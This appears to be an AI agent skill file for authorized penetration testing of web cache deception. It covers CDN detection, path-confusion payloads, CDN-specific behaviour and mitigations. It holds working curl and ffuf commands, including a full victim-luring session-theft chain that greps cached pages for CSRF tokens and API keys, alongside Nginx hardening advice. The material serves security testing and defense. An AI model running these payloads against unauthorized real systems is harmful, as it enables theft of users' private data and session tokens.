---
name: web-cache-deception
description: Web Cache Deception attack specialist for authorized penetration tests — covers path confusion via appended static extensions (.css/.js/.jpg), cache-control header manipulation, CDN-specific behavior (Cloudflare, Varnish, Nginx, CloudFront), exploitation for session theft and sensitive data exposure, and mitigation. Use when testing web applications backed by a CDN or reverse proxy for cache deception vulnerabilities.
---

## Trigger

Fire when: user says "web cache deception", "cache deception", "path confusion cache", "appended extension cache", "Cloudflare cache deception", "cached authenticated response", "cache session theft", "static extension caching", or any request to test whether a CDN is caching authenticated/dynamic pages due to path confusion.

---

## Version Pins (2026-10-31 verified)

| Tool | Version | Notes |
|------|---------|-------|
| Param Miner (Burp ext) | **1.6** | Cache deception scanner built-in |
| nuclei | **3.3.8** | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@v3.3.8` |
| Burp Suite Pro | 2025.x | Manual cache deception testing |
| ffuf | **2.1.0** | `go install github.com/ffuf/ffuf/v2@v2.1.0` |

---

## Instructions

### Phase 1: Confirm Caching Infrastructure
```bash
# Check for CDN/cache in response headers
curl -sI https://target.com/ | grep -Ei "cf-ray|x-cache|x-amz-cf|via|age|cache-control|surrogate"

# Identify CDN from headers:
# cf-ray → Cloudflare
# x-amz-cf-id → CloudFront
# x-served-by → Fastly/Varnish
# x-cache: HIT from cloudfront → CloudFront
```

### Phase 2: Map Authenticated Endpoints
```bash
# Identify endpoints that return user-specific data (session required)
# Target profile pages, account pages, dashboard, API endpoints:
# /account, /profile, /dashboard, /settings, /api/user/me
```

### Phase 3: Path Confusion Test
```bash
# Append a static extension to an authenticated endpoint
curl -sI -H "Cookie: session=YOUR_VALID_SESSION" \
  "https://target.com/account/profile.css" | grep -Ei "cache-control|age|x-cache"

# If response contains Age: > 0 or X-Cache: HIT → VULNERABLE

# Second request without session:
curl -sI "https://target.com/account/profile.css" | grep -Ei "age|x-cache"
# If this returns user data → Cache Deception confirmed
```

### Phase 4: Exploit — Session/Token Theft
```bash
# 1. Trick victim into visiting the crafted URL:
#    https://target.com/account/profile.css
# 2. The server returns their authenticated profile page
# 3. CDN caches it under /account/profile.css
# 4. Attacker fetches same URL → gets victim's data
```

### Phase 5: Report
- CVSS: 8.0–9.0 HIGH (session token in cached response = CRITICAL)
- Evidence: two curl outputs — authenticated response cached, unauthenticated response returning same data.

---

## 1. Path Confusion Techniques

### Standard extension appending
```bash
# Test these extensions against authenticated endpoints
EXTENSIONS=(".css" ".js" ".jpg" ".png" ".gif" ".ico" ".woff" ".woff2" ".svg" ".map")
BASE_URL="https://target.com/account/profile"
SESSION="Cookie: session=abc123"

for ext in "${EXTENSIONS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "$SESSION" "${BASE_URL}${ext}")
  CACHE=$(curl -sI -H "$SESSION" "${BASE_URL}${ext}" | grep -i "age:" | head -1)
  echo "${ext}: HTTP ${STATUS} | ${CACHE}"
done
```

### Path delimiter confusion
```bash
# Try path separators that cause server/CDN split-brain
# Server: /account/profile   CDN key: /account/profile;.css
curl -sI -H "Cookie: session=abc123" "https://target.com/account/profile;.css"
curl -sI -H "Cookie: session=abc123" "https://target.com/account/profile?.css"
curl -sI -H "Cookie: session=abc123" "https://target.com/account/profile%2F.css"
curl -sI -H "Cookie: session=abc123" "https://target.com/account/profile%23.css"

# Null byte (older servers)
curl -sI -H "Cookie: session=abc123" "https://target.com/account/profile%00.css"

# Double slash (path normalization)
curl -sI -H "Cookie: session=abc123" "https://target.com/account//profile.css"
```

### URL encoding tricks
```bash
# %2f = / — CDN may not decode, server does
curl -sI -H "Cookie: session=abc123" "https://target.com/account%2fprofile.css"

# %3b = ; — semicolon path parameter confusion
curl -sI -H "Cookie: session=abc123" "https://target.com/account/profile%3b.css"

# %2e = . — dot confusion
curl -sI -H "Cookie: session=abc123" "https://target.com/account/profile%2ecss"
```

---

## 2. CDN-Specific Behavior

### Cloudflare
```
Default caches: .css .js .jpg .jpeg .gif .ico .png .svg .woff .woff2 .ttf .otf .eot
Does NOT cache by default: pages with cookies (unless Page Rules say otherwise)
Bypass indicator: CF-Cache-Status: MISS vs HIT

Test:
  curl -sI -H "Cookie: session=X" "https://target.com/account.css" | grep CF-Cache-Status
  # If CF-Cache-Status: HIT on second request (without cookie) → VULNERABLE

Cache-Control override: Cloudflare respects "Cache-Control: no-store" from origin
Fix: Add Cache-Control: no-store to all authenticated responses
```

```bash
# Cloudflare-specific test
curl -sI "https://target.com/account.css" | grep -i "cf-cache-status"
# First req (attacker): MISS
# Victim visits: https://target.com/account.css → authenticated response cached
# Second attacker req: HIT → victim data
```

### CloudFront (AWS)
```
Caches based on URL path by default (ignores cookies unless configured)
Indicator: X-Cache: Hit from cloudfront

Test for unconfigured cookie forwarding:
curl -sI -H "Cookie: session=X" "https://d1xxx.cloudfront.net/account.css"
curl -sI "https://d1xxx.cloudfront.net/account.css" | grep "x-cache"
```

### Varnish
```
VCL controls caching rules; default config caches GET requests with static extensions
Indicator: Age: > 0 in response headers

Check VCL for authentication exception:
  Does VCL contain: if (req.http.Authorization || req.http.Cookie) { return(pass); }
  If this check is path-based (only for /) rather than for all paths → VULNERABLE
```

### Nginx (proxy_cache)
```
nginx.conf caching typically configured per location block:
location ~* \.(css|js|jpg|png)$ {
    proxy_cache my_cache;
    proxy_cache_valid 200 1h;
}

If /account/*.css matches this block AND the backend returns 200 → CACHED

Test:
curl -sI "https://target.com/account/settings.css" | grep "X-Cache-Status"
```

---

## 3. Automated Scanning

### Param Miner (Burp Suite)
```
Burp Suite → Extensions → Param Miner (install from BApp Store)
Target: https://target.com/account/profile
Options:
  ✓ Find cache poisoning
  ✓ Detect unkeyed inputs
  ✓ Active scan mode

Param Miner will automatically test path suffix variations and detect caching
```

### Nuclei cache deception templates
```bash
# Run nuclei cache-related checks
nuclei -u https://target.com -t http/vulnerabilities/generic/cache-poisoning.yaml
nuclei -u https://target.com -t http/misconfiguration/ -silent | grep -i cache

# Check nuclei-templates for dedicated cache-deception templates
ls $(go env GOPATH)/pkg/mod/github.com/projectdiscovery/nuclei-templates*/http/vulnerabilities/ \
  | grep -i cache
```

### ffuf path fuzzing for cached responses
```bash
# Fuzz authenticated endpoint with extension wordlist
cat << 'EOF' > /tmp/extensions.txt
.css
.js
.jpg
.png
.gif
.ico
.woff
.woff2
.svg
.map
;.css
?.css
%3b.css
%2f.css
EOF

ffuf -u "https://target.com/account/profileFUZZ" \
  -w /tmp/extensions.txt \
  -H "Cookie: session=abc123" \
  -H "Cache-Control: no-cache" \
  -mc 200 \
  -of json -o /tmp/ffuf-cache.json

# Then check which responses get cached on second hit without cookie
```

---

## 4. Exploitation — Session Theft Full Chain

```bash
# Step 1: Identify victim is logged in (out-of-band, social engineering, or known user)
# Step 2: Get victim to visit the poisoning URL (email, embedded link, etc.)
#   Payload URL: https://target.com/account/profile.js

# Step 3: CDN caches the victim's authenticated response at /account/profile.js

# Step 4: Attacker fetches the URL without session
curl -s "https://target.com/account/profile.js"
# Response: victim's profile page including their CSRF token, email, session info

# Step 5: Extract sensitive data
curl -s "https://target.com/account/profile.js" | grep -Ei "csrf|token|email|phone|api.key"
```

### High-value cache deception targets
```
/account/settings.css       → CSRF tokens, email addresses, API keys
/account/profile.js         → User PII, preferences
/api/user/me.png            → Full user object (if API returns JSON on any path)
/dashboard/overview.woff    → Dashboard data
/admin/users.css            → Admin user list
/auth/token.js              → Auth tokens if reflected in page
```

---

## 5. Mitigation

| Fix | Implementation |
|-----|---------------|
| `Cache-Control: no-store` on all authenticated responses | Nginx: `add_header Cache-Control "no-store, no-cache";` |
| CDN: disable caching for paths with session cookies | Cloudflare Page Rule: `Cache Level: Bypass` for `/account/*` |
| Validate path before responding | App-level: reject requests to `/account/*.css` with 404 |
| Use `Vary: Cookie` header | Forces CDN to cache separate copy per cookie value |
| CloudFront: configure Origin Request Policy to forward cookies | Prevents caching of cookie-dependent responses |
| Nginx: limit `proxy_cache` to truly static locations | Only cache `/static/*`, `/assets/*`, never `/account/*` |
| Audit CDN cache rules quarterly | Use `curl -sI` checks in CI against authenticated endpoints |

### Nginx hardening example
```nginx
# Static assets — OK to cache
location /static/ {
    proxy_cache my_cache;
    proxy_cache_valid 200 1d;
}

# Authenticated app — NEVER cache
location /account/ {
    proxy_no_cache 1;
    proxy_cache_bypass 1;
    add_header Cache-Control "no-store, private";
}

# API — NEVER cache
location /api/ {
    proxy_no_cache 1;
    proxy_cache_bypass 1;
    add_header Cache-Control "no-store";
}
```

---

## Known CVEs / Research (2024–2026)

| Reference | Component | Impact |
|-----------|-----------|--------|
| [CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927) | Next.js middleware | Auth bypass + cache deception overlap |
| PortSwigger Research 2024 | Generic CDN | Cloudflare, Akamai, CloudFront affected by path confusion |
| [PortSwigger 2025 Update](https://portswigger.net/research/gotta-cache-em-all) | Nginx/Varnish | Null-byte and semicolon delimiter bypasses documented |

---

## References

- Omer Gil — "Web Cache Deception Attack" (original research 2017, updated 2024) — https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html
- PortSwigger — "Gotta Cache 'em all" (2024) — https://portswigger.net/research/gotta-cache-em-all
- PortSwigger Web Security Academy — https://portswigger.net/web-security/web-cache-deception
- Cloudflare CDN Cache Behavior — https://developers.cloudflare.com/cache/concepts/default-cache-behavior/
- CloudFront Cache Keys — https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/controlling-the-cache-key.html
- `projectdiscovery/nuclei-templates` — http/vulnerabilities/generic/ (MIT)
